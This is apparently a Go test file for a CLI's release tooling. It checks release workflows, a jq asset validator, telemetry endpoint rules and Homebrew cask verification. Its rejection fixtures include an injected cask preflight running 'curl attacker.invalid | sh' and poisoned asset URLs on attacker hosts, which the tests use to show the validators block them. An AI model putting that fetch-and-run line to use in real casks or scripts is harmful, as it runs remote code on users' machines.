package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"github.com/aliyun/elastic-compute-control-cli/internal/releaseartifact"
)

func TestReleaseWorkflowUsesInfraGuardWebhookAction(t *testing.T) {
	workflowPath := filepath.Join("..", "..", ".github", "workflows", "release.yml")
	raw, err := os.ReadFile(workflowPath)
	if err != nil {
		t.Fatalf("read release workflow: %v", err)
	}

	workflow := string(raw)
	if !strings.Contains(workflow, `action: "edited"`) {
		t.Fatal(`release webhook action is not "edited" as required by the InfraGuard-compatible FC handler`)
	}
	if strings.Contains(workflow, `action: "published"`) {
		t.Fatal(`release webhook still contains unsupported action "published"`)
	}
	if !strings.Contains(workflow, `delivery_id=$(uuidgen | tr '[:upper:]' '[:lower:]')`) {
		t.Fatal("release webhook does not generate a fresh delivery ID for each retry")
	}
	if strings.Contains(workflow, "uuid.uuid5") {
		t.Fatal("release webhook still reuses a release-derived FC task ID")
	}
	for _, required := range []string{
		`X-Hub-Signature-256: sha256=${signature}`,
		`X-Fc-Invocation-Type: Async`,
		`X-Fc-Async-Task-Id: ${delivery_id}`,
		`case "${http_code}" in`,
		`409)`,
	} {
		if !strings.Contains(workflow, required) {
			t.Fatalf("release webhook is missing InfraGuard contract fragment %q", required)
		}
	}
}

func TestReleaseWorkflowUsesCurrentToolingForHistoricalRecovery(t *testing.T) {
	workflowPath := filepath.Join("..", "..", ".github", "workflows", "release.yml")
	raw, err := os.ReadFile(workflowPath)
	if err != nil {
		t.Fatal(err)
	}
	workflow := string(raw)
	for _, required := range []string{
		`ref: ${{ github.workflow_sha }}`,
		`path: tooling`,
		`path: release-source`,
		`--allow-existing-release`,
		`workdir: release-source`,
		`args: check --config ../tooling/.goreleaser.yaml`,
		`args: release --clean --skip=publish --config ../tooling/.goreleaser.yaml`,
		`args: release --clean --config ../tooling/.goreleaser.yaml`,
		`go -C tooling run ./cmd/releaseprep`,
		`--verify-homebrew-cask`,
		`dist/homebrew/Casks/ecctl.rb`,
		`ecctl_${RELEASE_VERSION}_cask.rb`,
		`Build GitHub release draft`,
		`Validate complete draft and publish immutable release`,
		`state=recovery`,
		`state=immutable`,
		`Stable recovery may only replay current latest`,
		`Snapshot stable OSS pointer before prerelease webhook`,
		`STABLE_VERSION_SNAPSHOT`,
		`--repo "${GITHUB_REPOSITORY}"`,
		`-f "${GITHUB_WORKSPACE}/tooling/.github/scripts/validate-release.jq"`,
	} {
		if !strings.Contains(workflow, required) {
			t.Fatalf("release workflow is missing %q", required)
		}
	}
	for _, forbidden := range []string{
		`Regenerate release files for recovery`,
		`--prepare-homebrew-cask`,
		`--output-file`,
		`actions/download-artifact`,
		`--cask Casks/ecctl.rb`,
		`mapfile -t generated_casks`,
		`mapfile -t cask_versions`,
	} {
		if strings.Contains(workflow, forbidden) {
			t.Fatalf("release workflow still contains historical recovery path %q", forbidden)
		}
	}
	snapshotIndex := strings.Index(workflow, "Snapshot stable OSS pointer before prerelease webhook")
	webhookIndex := strings.Index(workflow, "Trigger release webhook")
	if snapshotIndex < 0 || webhookIndex < 0 || snapshotIndex > webhookIndex {
		t.Fatal("prerelease OSS pointer is not snapshotted before the webhook")
	}
	if count := strings.Count(workflow, `gh release download "${RELEASE_TAG}" --repo "${GITHUB_REPOSITORY}"`); count != 3 {
		t.Fatalf("release workflow has %d repository-pinned release downloads, want 3", count)
	}
	if count := strings.Count(workflow, `-f "${GITHUB_WORKSPACE}/tooling/.github/scripts/validate-release.jq"`); count != 4 {
		t.Fatalf("release workflow has %d shared Release validators, want 4", count)
	}
}

func TestReleaseWorkflowManualNewReleaseUsesPublishedTagsBaseline(t *testing.T) {
	workflowPath := filepath.Join("..", "..", ".github", "workflows", "release.yml")
	raw, err := os.ReadFile(workflowPath)
	if err != nil {
		t.Fatal(err)
	}
	workflow := string(raw)
	for _, required := range []string{
		`git tag --merged refs/remotes/origin/main --list 'v*' > "${released_tags}"`,
		`version_args+=(--released-tags-file "${released_tags}")`,
		`elif [[ "${RELEASE_EVENT}" != "workflow_dispatch" ]]; then`,
	} {
		if !strings.Contains(workflow, required) {
			t.Fatalf("manual release version validation is missing %q", required)
		}
	}
}

func TestReleaseWorkflowFindsDraftOnlyWithWritePermission(t *testing.T) {
	workflowPath := filepath.Join("..", "..", ".github", "workflows", "release.yml")
	raw, err := os.ReadFile(workflowPath)
	if err != nil {
		t.Fatal(err)
	}
	workflow := string(raw)
	publishIndex := strings.Index(workflow, "\n  publish:\n")
	if publishIndex < 0 {
		t.Fatal("release workflow is missing publish job")
	}
	validateJob := workflow[:publishIndex]
	publishJobs := workflow[publishIndex:]
	if strings.Contains(validateJob, `gh release view "${RELEASE_TAG}"`) {
		t.Fatal("read-only validate job still attempts to discover draft Releases")
	}
	for _, required := range []string{
		`gh api "repos/${GITHUB_REPOSITORY}/releases/tags/${RELEASE_TAG}"`,
		`echo "state=recovery" >> "${GITHUB_OUTPUT}"`,
		`name: Validate recovery draft`,
		`if: needs.validate.outputs.release_state == 'recovery'`,
		`gh release view "${RELEASE_TAG}" --repo "${GITHUB_REPOSITORY}" --json apiUrl --jq '.apiUrl'`,
		`gh api "${release_api}" > "${release_file}"`,
		`gh api "repos/${GITHUB_REPOSITORY}/releases/${release_id}" > "${readback_file}"`,
	} {
		if !strings.Contains(publishJobs, required) && !strings.Contains(validateJob, required) {
			t.Fatalf("draft Release readback is missing %q", required)
		}
	}
	if !strings.Contains(workflow, `if [[ "${{ needs.validate.outputs.release_state }}" != "missing" ]]; then`) {
		t.Fatal("publish revalidation does not allow an existing recovery tag")
	}
	if count := strings.Count(workflow, `gh release view "${RELEASE_TAG}" --repo "${GITHUB_REPOSITORY}" --json apiUrl --jq '.apiUrl'`); count != 2 {
		t.Fatalf("release workflow has %d draft-capable Release lookups, want 2", count)
	}
}

func TestReleaseAssetValidatorAcceptsPublishedAndDraftURLsAndRejectsInvalidAssets(t *testing.T) {
	jqPath, err := exec.LookPath("jq")
	if err != nil {
		t.Skip("jq is required to execute the release workflow validator fixture")
	}

	const (
		repository = "aliyun/elastic-compute-control-cli"
		tag        = "v1.2.3"
		version    = "1.2.3"
	)
	names := []string{
		"checksums.txt",
		"version.txt",
		"ecctl_1.2.3_darwin_amd64.tar.gz",
		"ecctl_1.2.3_darwin_arm64.tar.gz",
		"ecctl_1.2.3_linux_amd64.tar.gz",
		"ecctl_1.2.3_linux_arm64.tar.gz",
		"ecctl_1.2.3_windows_amd64.zip",
		"ecctl_1.2.3_windows_arm64.zip",
		"ecctl_1.2.3_cask.rb",
	}
	assets := make([]map[string]any, 0, len(names)+1)
	for _, name := range names {
		assets = append(assets, map[string]any{
			"name":                 name,
			"state":                "uploaded",
			"digest":               "sha256:" + strings.Repeat("a", 64),
			"browser_download_url": "https://github.com/" + repository + "/releases/download/" + tag + "/" + name,
		})
	}
	release := map[string]any{
		"tag_name":   tag,
		"draft":      false,
		"immutable":  true,
		"prerelease": false,
		"html_url":   "https://github.com/" + repository + "/releases/tag/" + tag,
		"assets":     assets,
	}
	validator := filepath.Join("..", "..", ".github", "scripts", "validate-release.jq")
	validatorRaw, err := os.ReadFile(validator)
	if err != nil {
		t.Fatal(err)
	}
	for _, required := range []string{
		`($release.assets | length) == (expected_assets | length)`,
		`[$release.assets[].name]`,
		`all($release.assets[]; . as $asset |`,
		`$asset.digest | test("^sha256:[0-9a-f]{64}$")`,
		`$release.html_url | startswith("https://github.com/\($repository)/releases/tag/untagged-")`,
		`$asset.browser_download_url == (($release.html_url | sub("/releases/tag/"; "/releases/download/")) + "/" + $asset.name)`,
	} {
		if !strings.Contains(string(validatorRaw), required) {
			t.Fatalf("Release validator is missing %q", required)
		}
	}
	runValidator := func() error {
		t.Helper()
		fixture, marshalErr := json.Marshal(release)
		if marshalErr != nil {
			t.Fatal(marshalErr)
		}
		cmd := exec.Command(jqPath,
			"-e",
			"--arg", "tag", tag,
			"--arg", "version", version,
			"--arg", "repository", repository,
			"--argjson", "draft", fmt.Sprint(release["draft"]),
			"--argjson", "immutable", fmt.Sprint(release["immutable"]),
			"-f", validator,
		)
		cmd.Stdin = strings.NewReader(string(fixture))
		return cmd.Run()
	}

	if err := runValidator(); err != nil {
		t.Fatalf("valid immutable Release fixture rejected: %v", err)
	}

	draftURL := "https://github.com/" + repository + "/releases/tag/untagged-0123456789abcdef"
	release["draft"] = true
	release["immutable"] = false
	release["html_url"] = draftURL
	for _, asset := range assets {
		name := asset["name"].(string)
		asset["browser_download_url"] = strings.Replace(draftURL, "/releases/tag/", "/releases/download/", 1) + "/" + name
	}
	if err := runValidator(); err != nil {
		t.Fatalf("valid draft Release fixture rejected: %v", err)
	}

	assets[0]["browser_download_url"] = "https://github.com/attacker/example/releases/download/untagged-0123456789abcdef/checksums.txt"
	if err := runValidator(); err == nil {
		t.Fatal("draft Release fixture with a cross-repository asset URL was accepted")
	}
	assets[0]["browser_download_url"] = strings.Replace(draftURL, "/releases/tag/", "/releases/download/", 1) + "/wrong/checksums.txt"
	if err := runValidator(); err == nil {
		t.Fatal("draft Release fixture with an invalid asset path was accepted")
	}
	assets[0]["browser_download_url"] = strings.Replace(draftURL, "/releases/tag/", "/releases/download/", 1) + "/checksums.txt"

	assets = append(assets, map[string]any{
		"name":                 "poisoned-extra.txt",
		"state":                "open",
		"digest":               nil,
		"browser_download_url": "http://attacker.invalid/poisoned-extra.txt",
	})
	release["assets"] = assets
	if err := runValidator(); err == nil {
		t.Fatal("Release fixture with an invalid extra asset was accepted")
	}
}

func TestReleaseConfigurationBuildsCompleteDraftBeforePublishing(t *testing.T) {
	root := filepath.Join("..", "..")
	raw, err := os.ReadFile(filepath.Join(root, ".goreleaser.yaml"))
	if err != nil {
		t.Fatal(err)
	}
	config := string(raw)
	for _, required := range []string{
		"draft: true",
		"use_existing_draft: true",
		"replace_existing_artifacts: true",
		"skip_upload: true",
		releaseartifact.OSSBaseURL,
		"pkg/telemetry.releaseEndpointB64={{ .Env.ECCTL_TELEMETRY_ENDPOINT_B64 }}",
		"pkg/telemetry.releaseHeadersB64={{ .Env.ECCTL_TELEMETRY_HEADERS_B64 }}",
	} {
		if !strings.Contains(config, required) {
			t.Fatalf("GoReleaser configuration is missing %q", required)
		}
	}
	if strings.Contains(config, "releases/download/{{ .Tag }}") {
		t.Fatal("generated Homebrew Cask still points at GitHub instead of OSS")
	}

	ciRaw, err := os.ReadFile(filepath.Join(root, ".github", "workflows", "ci.yml"))
	if err != nil {
		t.Fatal(err)
	}
	ci := string(ciRaw)
	for _, required := range []string{"Verify snapshot Homebrew Cask", "dist/homebrew/Casks/ecctl.rb", "--verify-homebrew-cask", `ECCTL_TELEMETRY_ENDPOINT_B64: ""`, `ECCTL_TELEMETRY_HEADERS_B64: ""`} {
		if !strings.Contains(ci, required) {
			t.Fatalf("CI snapshot verification is missing %q", required)
		}
	}
	releaseRaw, err := os.ReadFile(filepath.Join(root, ".github", "workflows", "release.yml"))
	if err != nil {
		t.Fatal(err)
	}
	releaseWorkflow := string(releaseRaw)
	for _, required := range []string{"Validate release telemetry wiring", "Revalidate release telemetry configuration", "secrets.ECCTL_TELEMETRY_ENDPOINT_B64", "secrets.ECCTL_TELEMETRY_HEADERS_B64"} {
		if !strings.Contains(releaseWorkflow, required) {
			t.Fatalf("release telemetry injection is missing %q", required)
		}
	}
	validatorCommand := "go -C tooling run ./cmd/releaseprep --check-telemetry-config"
	if count := strings.Count(releaseWorkflow, validatorCommand); count != 2 {
		t.Fatalf("release workflow validator count = %d, want 2", count)
	}
	if strings.Contains(releaseWorkflow, `test -n "${ECCTL_TELEMETRY_`) {
		t.Fatal("release workflow still performs only a non-empty telemetry check")
	}
	validateJob := releaseWorkflow[:strings.Index(releaseWorkflow, "  publish:")]
	if strings.Contains(validateJob, "secrets.ECCTL_TELEMETRY_") {
		t.Fatal("unprotected validate job reads production telemetry secrets")
	}
}

func TestReleasePublishesHomebrewCaskThroughPullRequest(t *testing.T) {
	root := filepath.Join("..", "..")
	raw, err := os.ReadFile(filepath.Join(root, ".github", "workflows", "release.yml"))
	if err != nil {
		t.Fatal(err)
	}
	workflow := string(raw)
	notifyStart := strings.Index(workflow, "  notify:")
	if notifyStart < 0 {
		t.Fatal("release workflow has no notify job")
	}
	notifyJob := workflow[notifyStart:]
	for _, required := range []string{
		"pull-requests: write",
		`cask_branch="automation/homebrew-${RELEASE_VERSION}"`,
		"gh pr create",
		"gh pr merge",
		`--match-head-commit "${cask_commit}"`,
		`git checkout -B "${cask_branch}" origin/main`,
		`--cask "${GITHUB_WORKSPACE}/tooling/Casks/ecctl.rb"`,
		"Published Homebrew Cask readback does not match prepared content.",
	} {
		if !strings.Contains(notifyJob, required) {
			t.Fatalf("release Homebrew pull-request publishing is missing %q", required)
		}
	}
	if strings.Contains(notifyJob, `-f branch=main`) {
		t.Fatal("release workflow still writes the Homebrew Cask directly to protected main")
	}
	checkoutIndex := strings.Index(notifyJob, `git checkout -B "${cask_branch}" origin/main`)
	validationIndex := strings.Index(notifyJob, `--cask "${GITHUB_WORKSPACE}/tooling/Casks/ecctl.rb"`)
	if checkoutIndex < 0 || validationIndex < 0 || checkoutIndex > validationIndex {
		t.Fatal("release workflow does not validate the Cask from the fetched main baseline")
	}
}

func TestCheckTelemetryConfigUsesSharedStrictValidatorWithoutLeakingValues(t *testing.T) {
	encode := func(value string) string {
		value = strings.ReplaceAll(value, "example.com", "tracing-cn-hangzhou.arms.aliyuncs.com")
		return base64.StdEncoding.EncodeToString([]byte(value))
	}
	encodeRaw := func(value string) string { return base64.StdEncoding.EncodeToString([]byte(value)) }
	for _, valid := range []map[string]string{
		{
			"ECCTL_TELEMETRY_ENDPOINT_B64": encode("https://example.com/v1/traces?token=release-secret"),
			"ECCTL_TELEMETRY_HEADERS_B64":  encode(`{"x-token":"header-secret"}`),
		},
		{
			"ECCTL_TELEMETRY_ENDPOINT_B64": encode("https://example.com:4318/v1/traces"),
			"ECCTL_TELEMETRY_HEADERS_B64":  encode(`{}`),
		},
		{
			"ECCTL_TELEMETRY_ENDPOINT_B64": encode("https://example.com:1/v1/traces"),
			"ECCTL_TELEMETRY_HEADERS_B64":  encode(`{}`),
		},
		{
			"ECCTL_TELEMETRY_ENDPOINT_B64": encode("https://example.com:65535/v1/traces"),
			"ECCTL_TELEMETRY_HEADERS_B64":  encode("{\"x-token\":\"header-secret\\t\u00e9\"}"),
		},
	} {
		getenv := func(name string) string { return valid[name] }
		if err := checkTelemetryConfig(getenv); err != nil {
			t.Fatalf("valid telemetry config: %v", err)
		}
	}

	for _, tc := range []struct {
		name     string
		endpoint string
		headers  string
	}{
		{name: "missing", endpoint: "", headers: ""},
		{name: "endpoint base64", endpoint: "%%%", headers: encode(`{}`)},
		{name: "empty endpoint", endpoint: encode(""), headers: encode(`{}`)},
		{name: "http", endpoint: encode("http://release-secret.invalid/v1/traces"), headers: encode(`{}`)},
		{name: "relative", endpoint: encode("/v1/traces"), headers: encode(`{}`)},
		{name: "userinfo", endpoint: encode("https://user:release-secret@example.com/v1/traces"), headers: encode(`{}`)},
		{name: "fragment", endpoint: encode("https://example.com/v1/traces#release-secret"), headers: encode(`{}`)},
		{name: "third-party host", endpoint: encodeRaw("https://example.com/v1/traces"), headers: encode(`{}`)},
		{name: "suffix confusion", endpoint: encodeRaw("https://evilaliyuncs.com/v1/traces"), headers: encode(`{}`)},
		{name: "tenant Function Compute host", endpoint: encodeRaw("https://123456789.cn-hangzhou.fc.aliyuncs.com/v1/traces"), headers: encode(`{}`)},
		{name: "tenant OSS host", endpoint: encodeRaw("https://ecctl-metrics.oss-cn-hangzhou.aliyuncs.com/v1/traces"), headers: encode(`{}`)},
		{name: "legacy host with mismatched certificate", endpoint: encodeRaw("https://tracing-analysis-dc-hz.aliyuncs.com/v1/traces"), headers: encode(`{}`)},
		{name: "port zero", endpoint: encode("https://example.com:0/v1/traces"), headers: encode(`{}`)},
		{name: "port too large", endpoint: encode("https://example.com:65536/v1/traces"), headers: encode(`{}`)},
		{name: "port much too large", endpoint: encode("https://example.com:99999/v1/traces"), headers: encode(`{}`)},
		{name: "port empty", endpoint: encode("https://example.com:/v1/traces"), headers: encode(`{}`)},
		{name: "port non-numeric", endpoint: encode("https://example.com:not-a-port/v1/traces"), headers: encode(`{}`)},
		{name: "port negative", endpoint: encode("https://example.com:-1/v1/traces"), headers: encode(`{}`)},
		{name: "headers base64", endpoint: encode("https://example.com/v1/traces"), headers: "%%%"},
		{name: "headers null", endpoint: encode("https://example.com/v1/traces"), headers: encode(`null`)},
		{name: "headers array", endpoint: encode("https://example.com/v1/traces"), headers: encode(`[]`)},
		{name: "headers non-string", endpoint: encode("https://example.com/v1/traces"), headers: encode(`{"x-token":1}`)},
		{name: "header name", endpoint: encode("https://example.com/v1/traces"), headers: encode(`{"bad header":"header-secret"}`)},
		{name: "header name control", endpoint: encode("https://example.com/v1/traces"), headers: encode("{\"bad\\u0000name\":\"header-secret\"}")},
		{name: "header crlf", endpoint: encode("https://example.com/v1/traces"), headers: encode("{\"x-token\":\"header-secret\\r\\nleak\"}")},
		{name: "header nul", endpoint: encode("https://example.com/v1/traces"), headers: encode("{\"x-token\":\"header-secret\\u0000leak\"}")},
		{name: "header unit separator", endpoint: encode("https://example.com/v1/traces"), headers: encode("{\"x-token\":\"header-secret\\u001fleak\"}")},
		{name: "header delete", endpoint: encode("https://example.com/v1/traces"), headers: encode("{\"x-token\":\"header-secret\\u007fleak\"}")},
		{name: "duplicate header", endpoint: encode("https://example.com/v1/traces"), headers: encode(`{"Authorization":"a","authorization":"b"}`)},
		{name: "reserved header", endpoint: encode("https://example.com/v1/traces"), headers: encode(`{"Content-Encoding":"gzip"}`)},
	} {
		t.Run(tc.name, func(t *testing.T) {
			err := checkTelemetryConfig(func(name string) string {
				if name == "ECCTL_TELEMETRY_ENDPOINT_B64" {
					return tc.endpoint
				}
				return tc.headers
			})
			if err == nil {
				t.Fatal("invalid telemetry config was accepted")
			}
			for _, secret := range []string{"release-secret", "header-secret", tc.endpoint, tc.headers} {
				if secret != "" && strings.Contains(err.Error(), secret) {
					t.Fatalf("validator error leaked secret input: %v", err)
				}
			}
		})
	}
}

func TestValidatePublicModule(t *testing.T) {
	for _, module := range []string{
		"github.com/example/ecctl",
		"github.com/aliyun/ecctl",
		"github.com/aliyun/elastic-compute-control-cli",
	} {
		if err := validatePublicModule(module); err != nil {
			t.Fatalf("validatePublicModule(%q) = %v", module, err)
		}
	}

	for _, module := range []string{
		"",
		"ecctl",
		"gitlab.alibaba-inc.com/ai-storm/ecctl",
		"github.com/example/ecctl/v2",
		"github.com/bad_owner/ecctl",
		"github.com/-bad/ecctl",
		"github.com/bad-/ecctl",
		"github.com/example/bad/repo",
		"github.com/example/<repo>",
	} {
		if err := validatePublicModule(module); err == nil {
			t.Fatalf("validatePublicModule(%q) succeeded, want error", module)
		}
	}
}

func TestCheckReleaseReadyRejectsUnfrozenModule(t *testing.T) {
	root := t.TempDir()
	writeFile(t, filepath.Join(root, "go.mod"), "module ecctl\n\ngo 1.25.0\n")

	err := checkReleaseReady(root, "example/ecctl")
	if err == nil || !strings.Contains(err.Error(), "module path is not frozen") {
		t.Fatalf("checkReleaseReady error = %v, want module path failure", err)
	}
}

func TestCheckReleaseReadyRejectsReplace(t *testing.T) {
	root := t.TempDir()
	writeFile(t, filepath.Join(root, "go.mod"), "module github.com/example/ecctl\n\ngo 1.25.0\n\nreplace example.com/a => example.com/b v1.0.0\n")

	err := checkReleaseReady(root, "example/ecctl")
	if err == nil || !strings.Contains(err.Error(), "replace directives") {
		t.Fatalf("checkReleaseReady error = %v, want replace failure", err)
	}
}

func TestCheckReleaseReadyRejectsInstallPlaceholder(t *testing.T) {
	root := t.TempDir()
	writeFile(t, filepath.Join(root, "go.mod"), "module github.com/example/ecctl\n\ngo 1.25.0\n")
	writeFile(t, filepath.Join(root, "README.md"), "go install github.com/<owner>/ecctl/cmd/ecctl@latest\n")

	err := checkReleaseReady(root, "example/ecctl")
	if err == nil || !strings.Contains(err.Error(), "public release placeholders") {
		t.Fatalf("checkReleaseReady error = %v, want placeholder failure", err)
	}
}

func TestCheckReleaseReadyAllowsReleasePrepOnlyPlaceholders(t *testing.T) {
	root := t.TempDir()
	writeFile(t, filepath.Join(root, "go.mod"), "module github.com/example/ecctl\n\ngo 1.25.0\n")
	writeFile(t, filepath.Join(root, "Makefile"), "prepare-public-release:\n\tgo run ./cmd/releaseprep --write --module \"$(PUBLIC_MODULE)\"\n")
	writeFile(t, filepath.Join(root, "cmd", "releaseprep", "main.go"), "package main\n\nconst usage = \"github.com/<owner>/ecctl\"\n")
	writeFile(t, filepath.Join(root, "docs", "superpowers", "plans", "plan.md"), "Before publish, set PUBLIC_MODULE to github.com/<owner>/ecctl.\n")

	if err := checkReleaseReady(root, "example/ecctl"); err != nil {
		t.Fatalf("checkReleaseReady: %v", err)
	}
}

func TestCheckReleaseReadyRejectsRepositoryMismatch(t *testing.T) {
	root := t.TempDir()
	writeFile(t, filepath.Join(root, "go.mod"), "module github.com/attacker/ecctl\n\ngo 1.25.0\n")

	err := checkReleaseReady(root, "aliyun/elastic-compute-control-cli")
	if err == nil || !strings.Contains(err.Error(), "must match repository") {
		t.Fatalf("checkReleaseReady error = %v, want repository mismatch", err)
	}
}

func TestCheckReleaseReadyRejectsMismatchedGoInstallModule(t *testing.T) {
	root := t.TempDir()
	writeFile(t, filepath.Join(root, "go.mod"), "module github.com/aliyun/elastic-compute-control-cli\n\ngo 1.25.0\n")
	writeFile(t, filepath.Join(root, "README.md"), "go install github.com/attacker/ecctl/cmd/ecctl@latest\n")

	err := checkReleaseReady(root, "aliyun/elastic-compute-control-cli")
	if err == nil || !strings.Contains(err.Error(), "go install commands must use public module") {
		t.Fatalf("checkReleaseReady error = %v, want go install module mismatch", err)
	}
}

func TestCheckHomebrewCaskVersionAllowsAdvance(t *testing.T) {
	cask := filepath.Join(t.TempDir(), "ecctl.rb")
	writeFile(t, cask, "cask \"ecctl\" do\n  version \"1.2.3\"\nend\n")

	if err := checkHomebrewCaskVersion("v1.3.0", cask, false); err != nil {
		t.Fatalf("checkHomebrewCaskVersion: %v", err)
	}
}

func TestCheckHomebrewCaskVersionAllowsFirstRelease(t *testing.T) {
	if err := checkHomebrewCaskVersion("v0.0.0", "", true); err != nil {
		t.Fatalf("checkHomebrewCaskVersion first release: %v", err)
	}
}

func TestCheckHomebrewCaskVersionRequiresExplicitCaskState(t *testing.T) {
	for _, test := range []struct {
		name         string
		cask         string
		firstRelease bool
	}{
		{name: "missing state"},
		{name: "ambiguous state", cask: "ecctl.rb", firstRelease: true},
	} {
		t.Run(test.name, func(t *testing.T) {
			if err := checkHomebrewCaskVersion("v1.0.0", test.cask, test.firstRelease); err == nil {
				t.Fatal("checkHomebrewCaskVersion succeeded, want explicit state error")
			}
		})
	}
}

func TestCheckHomebrewCaskVersionRejectsNonAdvance(t *testing.T) {
	for _, test := range []struct {
		name string
		tag  string
		want string
	}{
		{name: "downgrade", tag: "v1.2.2", want: "refusing to downgrade"},
		{name: "stable build metadata downgrade", tag: "v1.2.2+old-build", want: "refusing to downgrade"},
		{name: "equal", tag: "v1.2.3", want: "equal-precedence"},
		{name: "build metadata is equal precedence", tag: "v1.2.3+build.2", want: "equal-precedence"},
	} {
		t.Run(test.name, func(t *testing.T) {
			cask := filepath.Join(t.TempDir(), "ecctl.rb")
			writeFile(t, cask, "cask \"ecctl\" do\n  version \"1.2.3\"\nend\n")
			err := checkHomebrewCaskVersion(test.tag, cask, false)
			if err == nil || !strings.Contains(err.Error(), test.want) {
				t.Fatalf("checkHomebrewCaskVersion(%q) error = %v, want %q", test.tag, err, test.want)
			}
		})
	}
}

func TestCheckHomebrewCaskVersionAllowsPrereleaseWithoutReadingCask(t *testing.T) {
	if err := checkHomebrewCaskVersion("v1.3.0-rc.1", filepath.Join(t.TempDir(), "missing.rb"), false); err != nil {
		t.Fatalf("checkHomebrewCaskVersion prerelease: %v", err)
	}
}

func TestCheckHomebrewCaskVersionRejectsMalformedInput(t *testing.T) {
	for _, test := range []struct {
		name    string
		tag     string
		content string
	}{
		{name: "malformed tag", tag: "v1.02.3", content: "version \"1.2.3\"\n"},
		{name: "missing version", tag: "v1.2.4", content: "cask \"ecctl\" do\nend\n"},
		{name: "multiple versions", tag: "v1.2.4", content: "version \"1.2.2\"\nversion \"1.2.3\"\n"},
		{name: "malformed current version", tag: "v1.2.4", content: "version \"1.02.3\"\n"},
	} {
		t.Run(test.name, func(t *testing.T) {
			cask := filepath.Join(t.TempDir(), "ecctl.rb")
			writeFile(t, cask, test.content)
			if err := checkHomebrewCaskVersion(test.tag, cask, false); err == nil {
				t.Fatalf("checkHomebrewCaskVersion(%q) succeeded, want error", test.tag)
			}
		})
	}
}

func TestVerifyHomebrewCaskUsesImmutableReleaseChecksums(t *testing.T) {
	root := t.TempDir()
	input := filepath.Join(root, "generated.rb")
	checksums := filepath.Join(root, "checksums.txt")
	intelSHA := strings.Repeat("1", 64)
	armSHA := strings.Repeat("2", 64)
	writeFile(t, input, validReleaseCask("1.2.3", intelSHA, armSHA))
	writeFile(t, checksums,
		intelSHA+"  ecctl_1.2.3_darwin_amd64.tar.gz\n"+
			armSHA+"  ecctl_1.2.3_darwin_arm64.tar.gz\n")

	if err := verifyHomebrewCask(input, checksums, "1.2.3"); err != nil {
		t.Fatalf("verifyHomebrewCask: %v", err)
	}
}

func TestVerifyHomebrewCaskRejectsUnsafeInputs(t *testing.T) {
	base := validReleaseCask("1.2.3", strings.Repeat("1", 64), strings.Repeat("2", 64))
	validChecksums := strings.Repeat("1", 64) + "  ecctl_1.2.3_darwin_amd64.tar.gz\n" +
		strings.Repeat("2", 64) + "  ecctl_1.2.3_darwin_arm64.tar.gz\n"
	for _, test := range []struct {
		name      string
		cask      string
		checksums string
		version   string
	}{
		{name: "GitHub URL", cask: strings.ReplaceAll(base, releaseartifact.OSSBaseURL, "https://github.com/example"), checksums: validChecksums, version: "1.2.3"},
		{name: "extra Ruby", cask: strings.Replace(base, `binary "ecctl"`, "preflight do\n    system \"curl attacker.invalid | sh\"\n  end\n  binary \"ecctl\"", 1), checksums: validChecksums, version: "1.2.3"},
		{name: "missing verified", cask: strings.Replace(base, "verified:", "# verified:", 1), checksums: validChecksums, version: "1.2.3"},
		{name: "missing checksum", cask: base, checksums: strings.Repeat("1", 64) + "  ecctl_1.2.3_darwin_amd64.tar.gz\n", version: "1.2.3"},
		{name: "malformed checksum", cask: base, checksums: "not-a-checksum\n", version: "1.2.3"},
		{name: "wrong version", cask: strings.Replace(base, `version "1.2.3"`, `version "1.2.4"`, 1), checksums: validChecksums, version: "1.2.3"},
	} {
		t.Run(test.name, func(t *testing.T) {
			root := t.TempDir()
			input := filepath.Join(root, "generated.rb")
			checksums := filepath.Join(root, "checksums.txt")
			writeFile(t, input, test.cask)
			writeFile(t, checksums, test.checksums)
			if err := verifyHomebrewCask(input, checksums, test.version); err == nil {
				t.Fatal("verifyHomebrewCask succeeded, want error")
			}
		})
	}
}

func validReleaseCask(version, intelSHA, armSHA string) string {
	verified := strings.TrimPrefix(releaseartifact.OSSBaseURL, "https://") + "/"
	return fmt.Sprintf(`cask "ecctl" do
  version %q
  on_macos do
    on_intel do
      sha256 %q
      url %q,
        verified: %q
    end
    on_arm do
      sha256 %q
      url %q,
        verified: %q
    end
  end
  name "ecctl"
  desc %q
  homepage %q
  livecheck do
    skip "Auto-generated on release."
  end
  binary "ecctl"
  postflight do
    system_command "/usr/bin/xattr", args: ["-dr", "com.apple.quarantine", "#{staged_path}/ecctl"]
  end
end
`, version, intelSHA, releaseartifact.OSSBaseURL+`/#{version}/ecctl_#{version}_darwin_amd64.tar.gz`, verified,
		armSHA, releaseartifact.OSSBaseURL+`/#{version}/ecctl_#{version}_darwin_arm64.tar.gz`, verified,
		releaseartifact.Description, releaseartifact.Homepage)
}

func TestCheckReleaseVersionAllowsCanonicalAdvance(t *testing.T) {
	root := t.TempDir()
	current := filepath.Join(root, "current.txt")
	previous := filepath.Join(root, "previous.txt")
	writeFile(t, current, "1.3.0\n")
	writeFile(t, previous, "1.2.3\n")

	got, err := checkReleaseVersion(current, previous, "", "v1.3.0")
	if err != nil {
		t.Fatalf("checkReleaseVersion: %v", err)
	}
	if got != "1.3.0" {
		t.Fatalf("checkReleaseVersion = %q, want 1.3.0", got)
	}
}

func TestCheckReleaseVersionAllowsPrereleaseAdvance(t *testing.T) {
	root := t.TempDir()
	current := filepath.Join(root, "current.txt")
	previous := filepath.Join(root, "previous.txt")
	writeFile(t, current, "1.3.0-rc.2\n")
	writeFile(t, previous, "1.3.0-rc.1\n")

	if _, err := checkReleaseVersion(current, previous, "", "v1.3.0-rc.2"); err != nil {
		t.Fatalf("checkReleaseVersion: %v", err)
	}
}

func TestCheckReleaseVersionRejectsInvalidFiles(t *testing.T) {
	for _, test := range []struct {
		name    string
		content string
	}{
		{name: "empty"},
		{name: "missing newline", content: "1.2.3"},
		{name: "multiple lines", content: "1.2.3\n1.2.4\n"},
		{name: "carriage return", content: "1.2.3\r\n"},
		{name: "surrounding whitespace", content: " 1.2.3\n"},
		{name: "tag prefix", content: "v1.2.3\n"},
		{name: "build metadata", content: "1.2.3+build.1\n"},
		{name: "leading zero", content: "1.02.3\n"},
		{name: "byte order mark", content: "\xef\xbb\xbf1.2.3\n"},
	} {
		t.Run(test.name, func(t *testing.T) {
			path := filepath.Join(t.TempDir(), "version.txt")
			writeFile(t, path, test.content)
			if _, err := checkReleaseVersion(path, "", "", ""); err == nil {
				t.Fatal("checkReleaseVersion succeeded, want error")
			}
		})
	}
}

